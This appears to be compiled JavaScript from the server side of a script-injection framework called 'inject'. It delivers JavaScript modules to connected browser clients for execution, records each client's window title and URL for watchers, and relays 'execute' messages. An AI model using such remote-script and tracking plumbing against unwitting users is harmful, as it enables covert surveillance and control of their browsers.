"use strict";
exports.__esModule = true;
var chalk_1 = require("chalk");
var default_1 = /** @class */ (function () {
    function default_1(that) {
        var _this = this;
        this.on = {
            /**
             * Module loader
             */
            module: function (data) {
                try {
                    if (!data.name)
                        return;
                    var js = global.inject.modules[data.name];
                    if (_this.session.debug)
                        js = global.inject.debugModules[data.name];
                    if (js) {
                        try {
                            js = "" + (typeof data.token === 'number' ? "module.token=" + data.token + ";" : "") + (data.params ? "module.params=" + JSON.stringify(data.params) + ";" : "") + "module.return=function(d){this.returned=d};" + js;
                            _this.send('module', {
                                name: data.name,
                                token: data.token,
                                script: js
                            });
                        }
                        catch (error) {
                            _this.send('module', {
                                name: data.name,
                                token: data.token,
                                error: {
                                    code: 'server-error',
                                    message: "Encountered a server-side error whilst loading module \"" + data.name + "\""
                                }
                            });
                        }
                    }
                    else {
                        _this.send('module', {
                            name: data.name,
                            token: data.token,
                            error: {
                                code: 'not-installed',
                                message: "Module \"" + data.name + "\" not installed on server"
                            }
                        });
                    }
                }
                catch (error) {
                    console.error(chalk_1["default"].redBright('[inject] ') +
                        chalk_1["default"].yellowBright(error));
                }
            },
            /**
             * Client info logger
             */
            i: function (data) {
                /**
                 * Max string length
                 */
                var maxStringLength = 100;
                var maxUrlLength = 2083;
                /**
                 * Safely parse data
                 */
                if (typeof data === 'object') {
                    if (typeof data.window === 'object') {
                        var _a = data.window, title = _a.title, url = _a.url, active = _a.active;
                        if (typeof title === 'string') {
                            _this.client.session.window.title = title.substring(0, maxStringLength);
                        }
                        if (typeof url === 'string') {
                            _this.client.session.window.url = url.substring(0, maxUrlLength);
                            _this.client.session.window.favicon = "https://plus.google.com/_/favicon?domain_url=" + encodeURIComponent(_this.client.session.window.url);
                        }
                        if (typeof active === 'boolean') {
                            _this.client.session.window.active = active;
                        }
                    }
                }
                /**
                 * Emit it listening watchers
                 */
                if (global.inject.clients[_this.project.id][_this.token] && global.inject.clients[_this.project.id][_this.token].watchers) {
                    global.inject.clients[_this.project.id][_this.token].watchers.forEach(function (watcher) {
                        watcher.emit(global.inject.clients[_this.project.id][_this.token]);
                    });
                }
            },
            /**
             * Data logger
             */
            l: function (data) {
                console.log(data);
            },
            /**
             * Error logger
             */
            e: function (data) {
                _this.send('error', data);
                console.log(data);
            },
            /**
             * Get server ping time
             */
            ping: function (pingTime) {
                _this.send('pong', pingTime);
            },
            /**
             * Get server ping time
             */
            heartbeat: function (data) {
                _this.send('stay-alive');
            },
            /**
             * For testing execute's from the client side
             */
            execute: function (data) {
                _this.send('execute', data);
            }
        };
        this.socket = that.socket;
        this.session = that.session;
        this.send = that.send;
        this.token = that.token;
        this.project = that.session.project;
        this.client = that.client;
    }
    return default_1;
}());
exports["default"] = default_1;
